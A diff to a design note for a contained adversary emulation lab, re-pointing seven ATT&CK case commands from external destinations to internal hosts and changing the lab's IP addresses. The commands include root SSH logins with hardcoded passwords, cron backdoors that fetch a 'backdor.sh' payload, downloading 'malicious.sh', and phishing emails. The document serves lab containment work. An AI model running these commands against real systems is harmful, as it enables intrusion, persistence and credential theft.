@@ -5,16 +5,16 @@
 The adversary emulation lab must run **fully contained**: no emulated command may
 reach the host machine or the public internet. The `docker/docker-compose.yml`
 topology is hardened so every service sits on internal-only networks
-(`internal: true`) — `caldera` (172.20.0.10), `kali` (172.20.0.20 / 172.21.0.10),
-`nginx` web target (172.21.0.20 / 172.22.0.10), and `db` backend (172.22.0.20)
-across the `172.20.0.0/24`, `172.21.0.0/24`, and `172.22.0.0/24` subnets.
+(`internal: true`) — `caldera` (192.168.10.10), `kali` (192.168.10.20 / 192.168.20.20),
+`nginx` web target (192.168.20.30 / 192.168.30.30), and `db` backend (192.168.30.40)
+across the `192.168.10.0/24`, `192.168.20.0/24`, and `192.168.30.0/24` subnets.
 
 Seven curated-case commands still referenced **external destinations** (public
 domains, `localhost`, `example.com`, an internet download, and external email
 recipients). Those destinations are unreachable in the hardened topology and would
 break end-to-end execution, so each command was re-pointed at an internal lab host
 while **preserving the ATT&CK technique and intent**. The `nginx` host
-(172.21.0.20) serves as the primary web target and `db` (172.22.0.20) as the
+(192.168.20.30) serves as the primary web target and `db` (192.168.30.40) as the
 backend / internal mail host.
 
 With these edits, all 8 curated cases are fully contained. Note that the
@@ -32,13 +32,13 @@ the host or the internet.
 - **Technique:** T1584.001 — Domains
 - **Original command:**
   ```
-  sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'curl -s --resolve oldsub.legitshipping.co.il:80:172.22.0.20 http://oldsub.legitshipping.co.il/; nc -vz 172.21.0.20 53; dig @172.21.0.20 oldsub.legitshipping.co.il; curl -s --header 'Host: oldsub.legitshipping.co.il' http://172.22.0.20/'
+  sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'curl -s --resolve oldsub.legitshipping.co.il:80:192.168.30.40 http://oldsub.legitshipping.co.il/; nc -vz 192.168.20.30 53; dig @192.168.20.30 oldsub.legitshipping.co.il; curl -s --header 'Host: oldsub.legitshipping.co.il' http://192.168.30.40/'
   ```
 - **Adapted command:**
   ```
-  sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'curl -s --header 'Host: oldsub.legitshipping.co.il' http://172.22.0.20/; nc -vz 172.21.0.20 53; dig @172.21.0.20 oldsub.legitshipping.co.il; curl -s --header 'Host: oldsub.legitshipping.co.il' http://172.22.0.20/'
+  sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'curl -s --header 'Host: oldsub.legitshipping.co.il' http://192.168.30.40/; nc -vz 192.168.20.30 53; dig @192.168.20.30 oldsub.legitshipping.co.il; curl -s --header 'Host: oldsub.legitshipping.co.il' http://192.168.30.40/'
   ```
-- **Rationale:** external destination `http://oldsub.legitshipping.co.il/` → internal lab host `172.22.0.20` (via impersonated `Host` header); ATT&CK technique preserved (legacy-domain / vhost impersonation is still modeled through the Host header).
+- **Rationale:** external destination `http://oldsub.legitshipping.co.il/` → internal lab host `192.168.30.40` (via impersonated `Host` header); ATT&CK technique preserved (legacy-domain / vhost impersonation is still modeled through the Host header).
 
 ### 2. CostaRicto — Scheduled Task
 - **Case slug:** `costaricto`
@@ -46,13 +46,13 @@ the host or the internet.
 - **Technique:** T1053.005 — Scheduled Task
 - **Original command:**
   ```
-  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "wget http://localhost/backdor.sh" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "* * * * * root /root/backdoor_task.sh" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'
+  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo "wget http://localhost/backdor.sh" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo "* * * * * root /root/backdoor_task.sh" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'
   ```
 - **Adapted command:**
   ```
-  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "wget http://172.21.0.20/backdor.sh" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "* * * * * root /root/backdoor_task.sh" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'
+  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo "wget http://192.168.20.30/backdor.sh" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo "* * * * * root /root/backdoor_task.sh" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'
   ```
-- **Rationale:** external destination `http://localhost/backdor.sh` → internal lab web target `172.21.0.20`; ATT&CK technique preserved (scheduled task fetching a payload).
+- **Rationale:** external destination `http://localhost/backdor.sh` → internal lab web target `192.168.20.30`; ATT&CK technique preserved (scheduled task fetching a payload).
 
 ### 3. Operation MidnightEclipse — Cron
 - **Case slug:** `operation_midnighteclipse`
@@ -60,13 +60,13 @@ the host or the internet.
 - **Technique:** T1053.003 — Cron
 - **Original command:**
   ```
-  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "wget http://localhost/backdor.sh" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "* * * * * root /root/backdoor_task.sh" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'
+  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo "wget http://localhost/backdor.sh" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo "* * * * * root /root/backdoor_task.sh" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'
   ```
 - **Adapted command:**
   ```
-  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "wget http://172.21.0.20/backdor.sh" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "* * * * * root /root/backdoor_task.sh" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'
+  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo "wget http://192.168.20.30/backdor.sh" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo "* * * * * root /root/backdoor_task.sh" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'
   ```
-- **Rationale:** external destination `http://localhost/backdor.sh` → internal lab web target `172.21.0.20`; ATT&CK technique preserved (cron job retrieving a payload).
+- **Rationale:** external destination `http://localhost/backdor.sh` → internal lab web target `192.168.20.30`; ATT&CK technique preserved (cron job retrieving a payload).
 
 ### 4. Operation MidnightEclipse — Unix Shell
 - **Case slug:** `operation_midnighteclipse`
@@ -74,13 +74,13 @@ the host or the internet.
 - **Technique:** T1059.004 — Unix Shell
 - **Original command:**
   ```
-  sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'curl -s http://example.com/malicious.sh | cat'
+  sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 'curl -s http://example.com/malicious.sh | cat'
   ```
 - **Adapted command:**
   ```
-  sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'curl -s http://172.21.0.20/malicious.sh | cat'
+  sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 'curl -s http://192.168.20.30/malicious.sh | cat'
   ```
-- **Rationale:** external destination `http://example.com/malicious.sh` → internal lab web target `172.21.0.20`; ATT&CK technique preserved (download and run a shell script).
+- **Rationale:** external destination `http://example.com/malicious.sh` → internal lab web target `192.168.20.30`; ATT&CK technique preserved (download and run a shell script).
 
 ### 5. Salesforce Data Exfiltration — Email Accounts
 - **Case slug:** `salesforce_data_exfiltration`
@@ -88,13 +88,13 @@ the host or the internet.
 - **Technique:** T1585.002 — Email Accounts
 - **Original command:**
   ```
-  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "Test email from attacker" | mail -s "Test Subject" shinycorp@tuta.com'
+  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo "Test email from attacker" | mail -s "Test Subject" shinycorp@tuta.com'
   ```
 - **Adapted command:**
   ```
-  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "Test email from attacker" | mail -s "Test Subject" shinycorp@172.22.0.20'
+  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo "Test email from attacker" | mail -s "Test Subject" shinycorp@192.168.30.40'
   ```
-- **Rationale:** external destination `shinycorp@tuta.com` → internal lab mail host `172.22.0.20`; ATT&CK technique preserved (attacker-controlled email account, now internal).
+- **Rationale:** external destination `shinycorp@tuta.com` → internal lab mail host `192.168.30.40`; ATT&CK technique preserved (attacker-controlled email account, now internal).
 
 ### 6. Salesforce Data Exfiltration — Impersonation
 - **Case slug:** `salesforce_data_exfiltration`
@@ -102,13 +102,13 @@ the host or the internet.
 - **Technique:** T1656 — Impersonation
 - **Original command:**
   ```
-  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "Click here and give me your password" | mail -s "Password Expired" victim@labcdcfake.com'
+  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo "Click here and give me your password" | mail -s "Password Expired" victim@labcdcfake.com'
   ```
 - **Adapted command:**
   ```
-  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "Click here and give me your password" | mail -s "Password Expired" victim@172.22.0.20'
+  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo "Click here and give me your password" | mail -s "Password Expired" victim@192.168.30.40'
   ```
-- **Rationale:** external destination `victim@labcdcfake.com` → internal lab mail host `172.22.0.20`; ATT&CK technique preserved (impersonation phishing email, now internal).
+- **Rationale:** external destination `victim@labcdcfake.com` → internal lab mail host `192.168.30.40`; ATT&CK technique preserved (impersonation phishing email, now internal).
 
 ### 7. ShadowRay — Exploitation for Privilege Escalation
 - **Case slug:** `shadowray`
@@ -116,10 +116,10 @@ the host or the internet.
 - **Technique:** T1068 — Exploitation for Privilege Escalation
 - **Original command:**
   ```
-  sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 wget https://nmap.org/dist/nmap-7.98.tgz
+  sshpass -p 'Passw0rd' ssh attacker@192.168.20.30 wget https://nmap.org/dist/nmap-7.98.tgz
   ```
 - **Adapted command:**
   ```
-  sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 wget http://172.21.0.20/dist/nmap-7.98.tgz
+  sshpass -p 'Passw0rd' ssh attacker@192.168.20.30 wget http://192.168.20.30/dist/nmap-7.98.tgz
   ```
-- **Rationale:** external destination `https://nmap.org/dist/nmap-7.98.tgz` → internal lab web target `172.21.0.20`; ATT&CK technique preserved (ingress tool transfer for privilege escalation).
+- **Rationale:** external destination `https://nmap.org/dist/nmap-7.98.tgz` → internal lab web target `192.168.20.30`; ATT&CK technique preserved (ingress tool transfer for privilege escalation).
